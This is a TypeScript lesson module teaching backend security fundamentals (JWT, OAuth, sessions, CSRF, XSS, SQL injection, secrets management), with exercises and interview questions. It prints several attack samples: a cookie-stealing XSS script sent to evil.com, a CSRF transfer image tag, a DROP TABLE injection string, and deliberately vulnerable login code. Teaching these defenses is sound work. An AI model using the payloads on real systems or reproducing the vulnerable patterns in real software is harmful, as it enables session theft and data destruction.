import type { Lesson } from '@/types';

export const securityFundamentalsLesson: Lesson = {
  id: 'security-fundamentals',
  slug: 'security-fundamentals',
  title: 'Security Fundamentals',
  description:
    'Master the core security concepts every backend engineer must know: authentication vs authorization, JWT, OAuth 2.0, sessions, CSRF, XSS, SQL injection, API security, and secrets management — with real attack examples and defenses.',
  category: 'Security',
  order: 16,
  difficulty: 'intermediate',
  estimatedTime: 50,
  prevLesson: 'api-gateway',
  nextLesson: 'high-level-design',

  content: `## Why Security Is Non-Negotiable

Security is not a feature you add at the end — it is a property of the system from day one. A single vulnerability can expose millions of users' data, destroy a company's reputation, and result in regulatory fines (GDPR fines up to 4% of global annual revenue). Understanding common attack vectors and defenses is a baseline expectation for every backend engineer.

This lesson covers the security concepts most frequently tested in system design interviews and most commonly violated in real production systems.

---

## Authentication vs Authorization

These terms are constantly confused. They are fundamentally different concepts:

**Authentication: Who are you?**
The process of verifying identity. Proving you are who you claim to be.
- Entering your username + password → authentication
- Scanning your fingerprint → authentication
- Presenting a JWT token → authentication

**Authorization: What can you do?**
The process of determining what actions an authenticated identity is permitted to perform.
- User 42 is authenticated. Can user 42 delete other users' posts? → authorization
- This JWT belongs to a valid user. Does this user have the "admin" role? → authorization

**Real-world analogy:**
At an airport, showing your passport proves who you are (authentication). The boarding pass determines which gate you're allowed through and which seat you sit in (authorization). Both are required — but they're separate steps by separate systems.

**In code, this looks like:**
\`\`\`
// Authentication middleware (identity verification)
app.use(verifyJWT);       // fails → 401 Unauthorized (identity unknown)

// Authorization middleware (permission check)
app.use(requireRole('admin'));  // fails → 403 Forbidden (identity known, permission denied)
\`\`\`

Note the distinct HTTP status codes: **401** for auth*entication* failure (you need to prove who you are), **403** for auth*orization* failure (I know who you are, but you can't do this).

---

## JWT — JSON Web Tokens

### How JWTs Work

A JWT is a self-contained token that carries user identity information, cryptographically signed so it cannot be tampered with.

**Structure:** Three Base64URL-encoded parts separated by dots:
\`\`\`
eyJhbGciOiJIUzI1NiJ9   .   eyJ1c2VySWQiOiI0MiJ9   .   SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
      Header                      Payload                         Signature
  (algorithm, type)           (claims/data)                 (HMAC of header+payload)
\`\`\`

**Header** (decoded): \`{ "alg": "HS256", "typ": "JWT" }\`
**Payload** (decoded): \`{ "userId": "42", "role": "admin", "exp": 1718928000, "iat": 1718924400 }\`
**Signature**: HMAC-SHA256(base64url(header) + "." + base64url(payload), secret)

### The JWT Authentication Flow
\`\`\`
1. User logs in with username + password
   POST /auth/login { email: "alice@example.com", password: "..." }

2. Server verifies credentials against database
   SELECT * FROM users WHERE email = ? AND password_hash = bcrypt(?)

3. Server creates and signs JWT
   const token = jwt.sign({ userId: 42, role: 'user' }, SECRET, { expiresIn: '1h' })

4. Server returns token to client
   { "accessToken": "eyJ...", "refreshToken": "eyJ...", "expiresIn": 3600 }

5. Client stores token and sends it with every request
   Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...

6. Server validates token on each request
   - Decode header + payload (no secret needed for decoding)
   - Verify signature using secret key
   - Check expiry (exp claim)
   - Extract userId and role from payload
   - No database lookup needed — the token is self-contained
\`\`\`

### Access Token vs Refresh Token Pattern

Access tokens should be short-lived (15 minutes to 1 hour). But short-lived tokens mean users get logged out frequently. The solution is a two-token pattern:

\`\`\`
Access Token:  Short-lived (15 min), sent with every API request
Refresh Token: Long-lived (30 days), stored securely, used ONLY to get new access tokens

Flow:
1. Login → get both tokens
2. Use access token for all API calls
3. Access token expires → client automatically sends refresh token to /auth/refresh
4. Server validates refresh token → issues new access token
5. Refresh token compromised → revoke it in database → user must re-login
\`\`\`

### JWT Advantages
- **Stateless**: server stores no session data. Scales to any number of servers with zero coordination.
- **Cross-service**: any service that knows the secret can validate the token — perfect for microservices
- **Self-contained**: no database lookup per request — faster
- **Language-agnostic**: a JWT signed by a Node.js service can be validated by a Python or Go service

### JWT Disadvantages
- **Cannot revoke before expiry**: once issued, a JWT is valid until it expires. If a user logs out or an account is compromised, the JWT is still valid until expiry. The only workaround is a token blacklist (which re-introduces server-side state).
- **Token size**: JWTs are larger than session IDs (hundreds of bytes vs ~32 bytes). Sent on every request.
- **Secret rotation**: rotating the signing secret invalidates all existing tokens — all users get logged out.
- **Sensitive data exposure**: the payload is base64-encoded, not encrypted. Never store sensitive data (password hashes, PII) in a JWT payload.

---

## OAuth 2.0

### Why OAuth Exists

Before OAuth, delegating access meant sharing your password. To let a third-party app post on your behalf, you gave it your Twitter password. That app now had full access to your account forever.

OAuth solves: **How do you grant a third-party application limited access to your account without sharing your password?**

**Real examples:**
- "Log in with Google" — Google verifies your identity, tells the app your email, without giving the app your Google password
- A GitHub CI/CD tool that reads your repos without knowing your GitHub password
- A Slack bot that can send messages to a specific channel, not read all channels

### Authorization Code Flow (User-Facing Apps)

\`\`\`
User                 Your App               Authorization Server (Google)
  │                      │                            │
  │── Click "Login with Google" ──→│                  │
  │                      │── Redirect to Google ──────→│
  │                      │   with client_id, scope,    │
  │                      │   redirect_uri, state       │
  │                      │                            │
  │←─────────── Google Login Page ─────────────────────│
  │── Enter Google credentials ──────────────────────→│
  │                      │                            │
  │←───────── Redirect back with authorization code ──│
  │                      │                            │
  │                      │── POST /token ────────────→│
  │                      │   code, client_id,          │
  │                      │   client_secret             │
  │                      │                            │
  │                      │←── access_token, id_token ─│
  │                      │    (+ refresh_token)        │
  │                      │                            │
  │←── Logged in! ────────│                            │
\`\`\`

**State parameter:** A random value your app generates and includes in the redirect to Google. Google echoes it back. Your app verifies it matches. This prevents CSRF attacks on the OAuth flow itself.

### Client Credentials Flow (Service-to-Service)

When there is no user involved — two backend services communicating:
\`\`\`
Service A                    Auth Server
    │── POST /token ────────────→│
    │   grant_type=client_credentials
    │   client_id=serviceA
    │   client_secret=<secret>   │
    │                            │
    │←── access_token ───────────│
    │
    │── Call Service B API (with access_token) ──→ Service B
\`\`\`

---

## Sessions vs JWT — Full Comparison

### How Sessions Work

\`\`\`
1. User logs in → server creates session in memory or database
   sessions["abc123"] = { userId: 42, role: "admin", createdAt: ... }

2. Server returns session ID as a cookie
   Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict

3. Browser automatically sends cookie on every request
   Cookie: sessionId=abc123

4. Server looks up session by ID on every request
   session = sessions["abc123"]  // database or Redis lookup
\`\`\`

**Sessions in distributed systems:**
When you have multiple servers, server 1 creates the session but server 2 doesn't know about it. Solutions:
- **Sticky sessions (session affinity):** Load balancer routes the same user to the same server. Problem: breaks if server fails, uneven load distribution.
- **Centralized session store (Redis):** All servers read/write sessions from a shared Redis cluster. This is the correct production approach.

### JWT vs Sessions Comparison

| Aspect | JWT | Sessions |
|--------|-----|---------|
| **Server storage** | None (stateless) | Database/Redis (stateful) |
| **Scalability** | Trivial — no coordination | Requires shared store or sticky sessions |
| **Revocation** | Hard — need blacklist | Easy — delete session record |
| **Token size** | Large (hundreds of bytes) | Small (32-byte session ID) |
| **Cross-service** | Easy — any service validates | Hard — session store must be accessible |
| **Security** | Payload visible (not encrypted) | Payload stored server-side (hidden) |
| **Logout** | Access token still valid until expiry | Immediate — delete session |
| **Best for** | Microservices, stateless APIs | Monoliths, when instant revocation needed |

---

## CSRF — Cross-Site Request Forgery

### The Attack

CSRF tricks a user's browser into making an authenticated request to your site without the user's knowledge.

**Attack scenario:**
\`\`\`
1. Alice logs into her bank (bank.com). Browser stores session cookie.

2. Alice visits a malicious site (evil.com). That site contains:
   <img src="https://bank.com/transfer?to=attacker&amount=1000">

3. Alice's browser fetches that URL automatically (it's an "image").
   The browser automatically includes bank.com's session cookie.

4. bank.com sees: authenticated request to transfer $1000 to attacker.
   Alice never clicked anything.
\`\`\`

### The Defense

**CSRF tokens:**
\`\`\`
1. When rendering a form, server generates a random CSRF token and stores it in the session
   <input type="hidden" name="_csrf" value="random-token-here">

2. Form submission must include the CSRF token in the body
   POST /transfer { to: "alice", amount: 100, _csrf: "random-token-here" }

3. Server compares submitted token to session-stored token
   Malicious site cannot read the CSRF token (cross-origin reads are blocked by CORS)
   → Attack fails
\`\`\`

**SameSite cookie attribute:**
\`\`\`
Set-Cookie: sessionId=abc123; SameSite=Strict
\`\`\`
- **Strict:** Cookie never sent with cross-site requests — strongest CSRF protection
- **Lax:** Cookie sent with top-level navigation (clicking links) but not with embedded resources
- **None:** Cookie sent with all requests (requires Secure flag) — disables CSRF protection

**JWTs stored in memory (not cookies) are immune to CSRF** because browsers don't auto-send Authorization headers cross-origin. This is one reason teams choose JWT over sessions for SPAs.

---

## XSS — Cross-Site Scripting

### The Attack

XSS allows attackers to inject malicious JavaScript into pages viewed by other users.

**Stored XSS** (most dangerous):
\`\`\`
1. Attacker posts a comment containing: <script>document.location='evil.com/steal?c='+document.cookie</script>

2. Your app stores this in the database without escaping.

3. Every user who views that comment runs the attacker's script.
   The script steals their session cookie and sends it to evil.com.
\`\`\`

**Reflected XSS:**
\`\`\`
Attacker crafts a link: https://yoursite.com/search?q=<script>steal()</script>
Victim clicks link → server reflects the unescaped parameter into the page → script runs
\`\`\`

### Defenses

1. **Escape output:** Every dynamic value rendered in HTML must be HTML-escaped. Use your framework's built-in escaping (React does this automatically for JSX; use \`{value}\` not \`dangerouslySetInnerHTML\`).

2. **Content Security Policy (CSP) headers:**
\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com
\`\`\`
Tells browsers to refuse to run any script not from your own origin or explicitly whitelisted CDNs. Even if XSS injects a script tag, CSP prevents it from executing.

3. **HttpOnly cookies:** Cookies marked HttpOnly cannot be read by JavaScript. This prevents XSS from stealing session cookies even if XSS succeeds.

---

## SQL Injection

### The Attack

SQL injection occurs when user input is concatenated directly into a SQL query string, allowing attackers to change the query structure.

**Classic example:**
\`\`\`sql
-- Vulnerable code:
const query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";

-- Attacker inputs:
username: admin' --
password: anything

-- Resulting query:
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
-- Everything after -- is a comment!
-- This logs in as admin without knowing the password.

-- More destructive:
username: '; DROP TABLE users; --
-- Resulting query: SELECT * FROM users WHERE username = ''; DROP TABLE users; --'
-- Deletes your entire users table!
\`\`\`

### Defenses

**Parameterized queries (prepared statements) — the only correct defense:**
\`\`\`typescript
// WRONG — vulnerable:
const query = \`SELECT * FROM users WHERE email = '\${email}'\`;

// CORRECT — parameterized:
const result = await db.query('SELECT * FROM users WHERE email = $1', [email]);
// The database treats $1 as data, never as SQL. Injection is structurally impossible.
\`\`\`

**Never concatenate user input into SQL strings.** Use ORMs (Prisma, TypeORM) or parameterized queries. ORMs use parameterized queries internally for all data operations.

Input validation (checking that an email looks like an email) is defense-in-depth but not a substitute for parameterized queries — attackers can craft input that passes validation but still injects.

---

## API Security Best Practices

1. **HTTPS always** — Never serve production APIs over plain HTTP. Man-in-the-middle attacks on HTTP are trivial in hostile network environments (coffee shops, corporate proxies).

2. **Validate all inputs** — Check types, formats, lengths, and allowed ranges for every field. Use a schema validation library (Zod, Joi, class-validator). Reject malformed requests early.

3. **Never expose internal error details** — Stack traces, database errors, and internal paths give attackers a map of your system. Return generic error messages to clients; log full details internally.

4. **Principle of least privilege** — Each API key, service account, and database user should have only the minimum permissions needed. A read-only API key cannot damage your database if compromised.

5. **Sensitive data in logs** — Never log passwords, tokens, credit card numbers, or PII. Use log sanitization middleware that redacts sensitive fields before they reach your log store.

---

## Secrets Management

### The Problem

Hardcoded secrets are the most common cause of credential leaks:
\`\`\`typescript
// NEVER DO THIS:
const stripe = new Stripe('sk_live_abc123secretkey');
const dbUrl = 'postgres://admin:mypassword@prod-db.example.com/app';
// These get committed to git, appear in logs, visible to any developer who clones the repo
\`\`\`

### Environment Variables (Minimum Baseline)
\`\`\`typescript
// Load from environment at runtime:
const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!);
const dbUrl = process.env.DATABASE_URL!;
\`\`\`
Store secrets in \`.env\` files that are in \`.gitignore\`. For production, inject via your deployment platform (Vercel environment variables, Kubernetes Secrets, GitHub Actions secrets).

**Limitation:** Environment variables are visible to all processes on the host. If a process is compromised, all env vars are exposed.

### Secrets Managers (Production Standard)
\`\`\`typescript
// AWS Secrets Manager
import { SecretsManagerClient, GetSecretValueCommand } from '@aws-sdk/client-secrets-manager';

const client = new SecretsManagerClient({ region: 'us-east-1' });
const response = await client.send(new GetSecretValueCommand({ SecretId: 'prod/stripe-key' }));
const secret = JSON.parse(response.SecretString!);
const stripeKey = secret.STRIPE_SECRET_KEY;
\`\`\`

Benefits of secrets managers:
- **Audit trail**: every secret access is logged (who, when, from where)
- **Rotation**: built-in rotation schedules — secret changes without code deployment
- **Access control**: IAM policies control which services can access which secrets
- **Encryption**: secrets encrypted at rest and in transit

**HashiCorp Vault** is the cloud-agnostic alternative. AWS Secrets Manager, Azure Key Vault, and GCP Secret Manager are the cloud-native options.

### Rotation Strategy

Secrets should rotate regularly:
- **Database passwords**: rotate monthly, or immediately on suspected compromise
- **API keys**: rotate quarterly, or on team member departure
- **JWT signing secrets**: rotate yearly (causes all-users logout — coordinate carefully)
- **Temporary credentials** (AWS IAM roles): rotate every 15 minutes automatically via role assumption`,

  codeExamples: [
    {
      title: 'JWT Authentication — Complete Implementation',
      code: `import jwt from 'jsonwebtoken';
import bcrypt from 'bcrypt';
import { Request, Response, NextFunction } from 'express';

const ACCESS_TOKEN_SECRET = process.env.JWT_ACCESS_SECRET!;
const REFRESH_TOKEN_SECRET = process.env.JWT_REFRESH_SECRET!;

// ── Token Generation ──────────────────────────────────────────────────
function generateTokens(userId: string, role: string) {
  const accessToken = jwt.sign(
    { userId, role },
    ACCESS_TOKEN_SECRET,
    { expiresIn: '15m' }  // Short-lived: 15 minutes
  );

  const refreshToken = jwt.sign(
    { userId },
    REFRESH_TOKEN_SECRET,
    { expiresIn: '30d' }  // Long-lived: 30 days
  );

  return { accessToken, refreshToken };
}

// ── Login Route ───────────────────────────────────────────────────────
app.post('/auth/login', async (req: Request, res: Response) => {
  const { email, password } = req.body;

  const user = await db.query('SELECT * FROM users WHERE email = $1', [email]);
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    // Same error message for both "user not found" and "wrong password"
    // Never reveal which one — prevents user enumeration attacks
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  const { accessToken, refreshToken } = generateTokens(user.id, user.role);

  // Store refresh token hash in DB (so we can revoke it)
  await db.query(
    'INSERT INTO refresh_tokens (user_id, token_hash, expires_at) VALUES ($1, $2, $3)',
    [user.id, await bcrypt.hash(refreshToken, 10), new Date(Date.now() + 30 * 24 * 3600 * 1000)]
  );

  res.json({ accessToken, refreshToken, expiresIn: 900 });
});

// ── Auth Middleware ───────────────────────────────────────────────────
export function authenticate(req: Request, res: Response, next: NextFunction) {
  const header = req.headers.authorization;
  if (!header?.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No token provided' });
  }

  try {
    const token = header.slice(7);
    const payload = jwt.verify(token, ACCESS_TOKEN_SECRET) as {
      userId: string;
      role: string;
    };
    req.user = payload; // Attach to request for downstream handlers
    next();
  } catch (err) {
    if (err instanceof jwt.TokenExpiredError) {
      return res.status(401).json({ error: 'Token expired', code: 'TOKEN_EXPIRED' });
    }
    return res.status(401).json({ error: 'Invalid token' });
  }
}

// ── Authorization Middleware ──────────────────────────────────────────
export function requireRole(...roles: string[]) {
  return (req: Request, res: Response, next: NextFunction) => {
    if (!roles.includes(req.user?.role)) {
      return res.status(403).json({
        error: 'Forbidden',
        message: \`Requires one of roles: \${roles.join(', ')}\`,
      });
    }
    next();
  };
}

// ── Token Refresh Route ───────────────────────────────────────────────
app.post('/auth/refresh', async (req: Request, res: Response) => {
  const { refreshToken } = req.body;
  if (!refreshToken) return res.status(401).json({ error: 'No refresh token' });

  try {
    const payload = jwt.verify(refreshToken, REFRESH_TOKEN_SECRET) as { userId: string };

    // Verify refresh token exists in DB (allows revocation)
    const stored = await db.query(
      'SELECT * FROM refresh_tokens WHERE user_id = $1 AND expires_at > NOW()',
      [payload.userId]
    );
    const valid = stored.some(r => bcrypt.compareSync(refreshToken, r.token_hash));
    if (!valid) return res.status(401).json({ error: 'Refresh token revoked' });

    const user = await db.query('SELECT * FROM users WHERE id = $1', [payload.userId]);
    const { accessToken } = generateTokens(user.id, user.role);

    res.json({ accessToken, expiresIn: 900 });
  } catch {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});`,
      explanation:
        'Complete JWT implementation with access + refresh token rotation, role-based authorization middleware, and revocation support via database-stored refresh token hashes.',
    },
    {
      title: 'SQL Injection — Vulnerable vs Safe',
      code: `// ============================================================
// VULNERABLE — DO NOT USE
// ============================================================
app.get('/users/search', async (req, res) => {
  const { name } = req.query;

  // DANGER: direct string concatenation
  const query = \`SELECT * FROM users WHERE name LIKE '%\${name}%'\`;
  // If name = "'; DROP TABLE users; --", your table is gone.

  const users = await db.raw(query);
  res.json(users);
});

// ============================================================
// SAFE — Parameterized Query (node-postgres)
// ============================================================
app.get('/users/search', async (req, res) => {
  const { name } = req.query as { name: string };

  // Input validation first (defense in depth)
  if (!name || name.length > 100 || !/^[a-zA-Z\s]+$/.test(name)) {
    return res.status(400).json({ error: 'Invalid name parameter' });
  }

  // Parameterized query — $1 is always treated as data, never as SQL
  const result = await db.query(
    'SELECT id, name, email FROM users WHERE name ILIKE $1',
    [\`%\${name}%\`]
  );
  res.json(result.rows);
});

// ============================================================
// SAFE — Using Prisma ORM (parameterized internally)
// ============================================================
app.get('/users/search', async (req, res) => {
  const { name } = req.query as { name: string };

  // Prisma always uses parameterized queries — injection structurally impossible
  const users = await prisma.user.findMany({
    where: { name: { contains: name, mode: 'insensitive' } },
    select: { id: true, name: true, email: true }, // only expose needed fields
  });
  res.json(users);
});

// ============================================================
// SAFE — Raw query with Prisma when needed
// ============================================================
const users = await prisma.$queryRaw\`
  SELECT id, name FROM users WHERE name ILIKE \${'%' + name + '%'}
\`;
// Template literal tag automatically parameterizes interpolations`,
      explanation:
        'Never concatenate user input into SQL strings. Always use parameterized queries or an ORM. Input validation is defense-in-depth but cannot replace parameterization.',
    },
    {
      title: 'CSRF Protection Middleware',
      code: `import crypto from 'crypto';
import { Request, Response, NextFunction } from 'express';

// ── CSRF Token Generation ─────────────────────────────────────────────
function generateCSRFToken(): string {
  return crypto.randomBytes(32).toString('hex');
}

// ── CSRF Middleware ───────────────────────────────────────────────────
export function csrfProtection(req: Request, res: Response, next: NextFunction) {
  // Safe methods don't need CSRF protection
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();

  // Get token from request body or header
  const submittedToken =
    req.body?._csrf ||
    req.headers['x-csrf-token'];

  // Get expected token from session
  const expectedToken = req.session?.csrfToken;

  if (!submittedToken || !expectedToken || submittedToken !== expectedToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }

  next();
}

// ── Inject CSRF Token into Session and Views ──────────────────────────
app.use((req: Request, res: Response, next: NextFunction) => {
  if (!req.session!.csrfToken) {
    req.session!.csrfToken = generateCSRFToken();
  }
  // Make token available to templates
  res.locals.csrfToken = req.session!.csrfToken;
  next();
});

// ── Usage in Routes ───────────────────────────────────────────────────
app.post('/transfer', csrfProtection, async (req, res) => {
  // CSRF validated — safe to process
  await processTransfer(req.body);
  res.json({ success: true });
});

// ── Cookie Configuration (additional layer) ───────────────────────────
app.use(session({
  secret: process.env.SESSION_SECRET!,
  cookie: {
    httpOnly: true,    // Prevent JS access → XSS can't steal cookie
    secure: true,      // HTTPS only
    sameSite: 'strict', // Prevent cross-site sending → CSRF protection
    maxAge: 24 * 60 * 60 * 1000, // 24 hours
  },
}));`,
      explanation:
        'CSRF protection combines: (1) CSRF tokens validated on state-changing requests, (2) SameSite=Strict cookie attribute that prevents cross-site cookie sending. SameSite alone is sufficient for modern browsers; tokens provide defense-in-depth for older clients.',
    },
  ],

  commonMistakes: [
    'Returning different error messages for "user not found" vs "wrong password" — this allows attackers to enumerate valid email addresses. Always return the same generic message: "Invalid credentials."',
    'Storing JWTs in localStorage — localStorage is accessible to JavaScript, so any XSS vulnerability can steal the token. Store access tokens in memory (JavaScript variable) and refresh tokens in HttpOnly cookies.',
    'Using long-lived access tokens (days or weeks) without a refresh token mechanism — if compromised, the attacker has access for the full token lifetime. Use 15-minute access tokens with refresh tokens.',
    'Concatenating user input into SQL strings instead of using parameterized queries — this is one of the oldest vulnerabilities in existence and still one of the most common causes of breaches.',
    'Using MD5 or SHA1 for password hashing — these are fast hash functions, making brute-force trivial. Always use bcrypt, argon2, or scrypt, which are intentionally slow and include salting.',
    'Logging sensitive data — accidentally logging tokens, passwords, or PII is a compliance violation and security risk. Audit your log statements and use sanitization middleware.',
    'Hardcoding secrets in source code — secrets committed to git remain in the git history even after deletion. Always use environment variables or a secrets manager. Use git-secrets or similar pre-commit hooks.',
    'Not rate-limiting authentication endpoints — without limits, login and password-reset endpoints are trivially brute-forceable. Apply strict rate limits (5 attempts/minute per IP and per account).',
  ],

  interviewQuestions: [
    {
      question: 'What is the difference between authentication and authorization? Give an HTTP status code for each failure.',
      difficulty: 'beginner',
      answer:
        'Authentication is verifying identity ("who are you?") — proving you are who you claim to be via a password, token, or certificate. Authorization is determining permissions ("what can you do?") — checking if your verified identity is allowed to perform a specific action. Authentication failure returns 401 Unauthorized (misleadingly named). Authorization failure returns 403 Forbidden. Real analogy: showing your passport at the airport is authentication; the boarding pass specifying your seat is authorization.',
      tip: 'Mention the HTTP status codes — 401 vs 403. Many candidates mix these up. Get it right to stand out.',
    },
    {
      question: 'What are the trade-offs between JWT and session-based authentication?',
      difficulty: 'intermediate',
      answer:
        "JWT is stateless — no server storage, trivially scalable across any number of servers, perfect for microservices where multiple services need to validate the same token. The critical disadvantage: you cannot revoke a JWT before it expires. Session-based auth stores state server-side (database or Redis), allowing instant revocation (delete the session record). Sessions require shared state store in distributed systems. For most SPAs and microservices: JWT with short expiry (15 min) plus refresh tokens. For applications needing instant revocation (banking, healthcare): sessions with Redis or JWT blacklist.",
      followUp: [
        'If a JWT is stolen, what can you do to limit the damage?',
        'How do you implement "logout all devices" with JWT?',
      ],
      tip: "The JWT revocation problem is the crux of this question. Always address it — it's what separates candidates who have actually shipped auth systems from those who haven't.",
    },
    {
      question: 'Explain a CSRF attack and two ways to defend against it.',
      difficulty: 'intermediate',
      answer:
        "CSRF exploits the fact that browsers automatically include cookies with cross-origin requests. Attacker hosts a page with a form or img tag pointing to the victim's bank. When the victim visits the attacker's page, their browser auto-sends the bank cookie, and the bank processes the attacker's request as if it came from the user. Defense 1: CSRF tokens — server generates a random token stored in the session and includes it in all forms; form submissions must include the token; attacker cannot read the token due to same-origin policy. Defense 2: SameSite=Strict cookie attribute — browser will not send cookies with cross-site requests at all, eliminating the attack vector entirely for modern browsers.",
      tip: 'Explain why CSRF tokens work: cross-origin reads are blocked by the browser. The attacker can forge the request but cannot read the CSRF token from your page.',
    },
    {
      question: 'What is SQL injection and how do you definitively prevent it?',
      difficulty: 'beginner',
      answer:
        "SQL injection occurs when user-supplied input is concatenated into a SQL query string, allowing the input to change the query's structure. Example: a login query concatenating username input can be exploited with username=\"admin'--\" to bypass password checking. The definitive prevention is parameterized queries (prepared statements) — the database driver sends the SQL template and data separately; the database always treats user input as data, never as SQL syntax, making injection structurally impossible. Input validation and escaping are defense-in-depth but not substitutes. Always use an ORM or parameterized queries for any query containing user input.",
      tip: "Emphasize 'structurally impossible' with parameterized queries — it's not about catching bad input, it's about changing the data model so injection cannot occur.",
    },
    {
      question: 'You discover that your app\'s database password is hardcoded in a GitHub repository (including git history). What do you do?',
      difficulty: 'advanced',
      answer:
        'Treat this as an active incident: (1) Immediately rotate the database password — assume it is already compromised. (2) Check access logs for the database and the repository for unauthorized access in the past. (3) Update the password in all deployment environments and secrets managers. (4) Revoke access for any third-party services that had the compromised credential. (5) Remove the secret from git history using git filter-branch or BFT Repo Cleaner — note that this requires force-pushing and coordinating with all team members to re-clone. (6) If the repo is public, assume the secret was scraped by bots within minutes of the commit — rotation is mandatory. (7) Add a pre-commit hook (git-secrets, detect-secrets) to prevent future secret commits. (8) Move all secrets to a secrets manager (AWS Secrets Manager, HashiCorp Vault).',
      tip: "Incident response questions test your operational maturity. Lead with immediate damage control (rotate the credential NOW), then explain investigation, remediation, and prevention steps in order.",
    },
    {
      question: 'What is the difference between XSS and CSRF? Why are their defenses different?',
      difficulty: 'intermediate',
      answer:
        "XSS (Cross-Site Scripting) injects malicious JavaScript into your page — the attack runs in the context of your origin, with full access to your DOM, cookies, and local storage. CSRF (Cross-Site Request Forgery) tricks the browser into making authenticated requests to your site from a different origin — the attack exploits the browser's automatic cookie sending, not code execution on your page. Defenses differ because the attack models differ. XSS defense: escape all output, CSP headers to block unauthorized script execution, HttpOnly cookies so scripts can't steal session cookies. CSRF defense: CSRF tokens (attacker can't read them cross-origin), SameSite cookies (browser won't send them cross-origin). XSS is harder to defend comprehensively because it requires escaping every single dynamic value; a single missed output creates a vector.",
      tip: "Frame the answer around attack model differences — once you explain the mechanism correctly, the defense rationale follows naturally.",
    },
  ],

  exercises: [
    {
      id: 'security-ex-1',
      title: 'Fix the Authentication Vulnerabilities',
      description:
        "Review the following authentication code and identify ALL security vulnerabilities. Then rewrite it with all vulnerabilities fixed. Hint: there are at least 6 distinct issues.",
      starterCode: `// VULNERABLE CODE — identify all issues before reading further
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Check credentials
  const query = \`SELECT * FROM users WHERE username = '\${username}' AND password = '\${password}'\`;
  const user = await db.raw(query);

  if (user.length === 0) {
    return res.status(401).json({ error: 'User not found' });
  }
  if (user[0].password !== password) {
    return res.status(401).json({ error: 'Wrong password' });
  }

  const token = jwt.sign({ userId: user[0].id, role: user[0].role }, 'mysecretkey');
  console.log(\`User \${username} logged in with token \${token}\`);

  res.json({ token });
});`,
      solution: `// VULNERABILITY ANALYSIS:
// 1. SQL injection: username/password concatenated into query string
// 2. Plain-text password comparison: passwords should be hashed (bcrypt)
// 3. User enumeration: different error messages reveal if username exists
// 4. Hardcoded JWT secret: 'mysecretkey' — should be from environment
// 5. No JWT expiry: tokens valid forever if secret never changes
// 6. Logging the token: tokens in logs are a credential leak

app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Input validation
  if (!username || !password || typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Username and password required' });
  }

  // Fix 1: Parameterized query (prevents SQL injection)
  const result = await db.query(
    'SELECT id, username, password_hash, role FROM users WHERE username = $1',
    [username]
  );
  const user = result.rows[0];

  // Fix 2 & 3: bcrypt comparison + same error message (prevents user enumeration)
  const validCredentials =
    user && await bcrypt.compare(password, user.password_hash);

  if (!validCredentials) {
    return res.status(401).json({ error: 'Invalid credentials' }); // same message always
  }

  // Fix 4 & 5: JWT secret from environment + expiry
  const token = jwt.sign(
    { userId: user.id, role: user.role },
    process.env.JWT_SECRET!,  // from environment
    { expiresIn: '15m' }       // short-lived
  );

  // Fix 6: never log tokens
  console.log(\`User \${username} (id:\${user.id}) logged in successfully\`);

  res.json({ token, expiresIn: 900 });
});`,
      hints: [
        'Count the distinct categories: data access, credential storage, error messages, configuration, token security, logging.',
        'The SQL query is the most dangerous issue — it allows bypassing authentication entirely.',
        'Look at both the error messages on lines 10 and 13 — what do they reveal to an attacker?',
      ],
    },
    {
      id: 'security-ex-2',
      title: 'Design Auth for a Multi-Tenant API',
      description:
        "Design the complete authentication and authorization system for a multi-tenant SaaS: multiple organizations, each with users who have different roles (owner, admin, member, viewer). Requirements: (1) A user can belong to multiple organizations with different roles in each. (2) API requests must include which organization's context they're operating in. (3) Resource access (e.g., viewing a document) must verify: is the user authenticated? Do they belong to the org that owns the document? Does their role in that org allow viewing? Write the JWT payload design, database schema sketch, and the authorization middleware.",
      starterCode: `// Design the following:

// 1. JWT payload structure — what claims to include?
interface JWTPayload {
  // TODO: design this
}

// 2. Database schema — how to model multi-org membership?
// users table: id, email, passwordHash
// organizations table: id, name, slug
// ??? what join table or additional model?

// 3. Authorization middleware
async function authorizeOrgAccess(
  req: Request,
  res: Response,
  next: NextFunction
) {
  // userId comes from JWT (already authenticated)
  // orgId comes from request (header? URL param? body?)
  // role for that org comes from ???
  // Check: is user a member of this org?
  // Attach role to request for route handlers to check
}

// 4. Route-level permission check
function requireOrgRole(...roles: string[]) {
  return (req: Request, res: Response, next: NextFunction) => {
    // TODO
  };
}`,
      solution: `// 1. JWT payload — minimal, no org-specific data (roles are per-org, not global)
interface JWTPayload {
  userId: string;
  email: string;
  // Do NOT include org roles here — a user has different roles per org
  // Roles fetched at request time from DB based on X-Org-Id header
}

// 2. Database schema
// users:             id, email, password_hash, created_at
// organizations:     id, name, slug, created_at
// org_memberships:   id, user_id, org_id, role, created_at
//   role: 'owner' | 'admin' | 'member' | 'viewer'
//   unique constraint on (user_id, org_id)
// documents:         id, org_id, title, content, created_by

// 3. Organization authorization middleware
async function authorizeOrgAccess(req: Request, res: Response, next: NextFunction) {
  const userId = req.user?.userId;  // from JWT (authenticate middleware ran first)
  const orgId = req.headers['x-org-id'] as string;

  if (!orgId) {
    return res.status(400).json({ error: 'X-Org-Id header required' });
  }

  const membership = await db.query(
    'SELECT role FROM org_memberships WHERE user_id = $1 AND org_id = $2',
    [userId, orgId]
  );

  if (membership.rows.length === 0) {
    return res.status(403).json({ error: 'You are not a member of this organization' });
  }

  req.orgId = orgId;
  req.orgRole = membership.rows[0].role;  // 'owner' | 'admin' | 'member' | 'viewer'
  next();
}

// 4. Role-based permission check
const ROLE_HIERARCHY = { viewer: 1, member: 2, admin: 3, owner: 4 };

function requireOrgRole(...roles: string[]) {
  return (req: Request, res: Response, next: NextFunction) => {
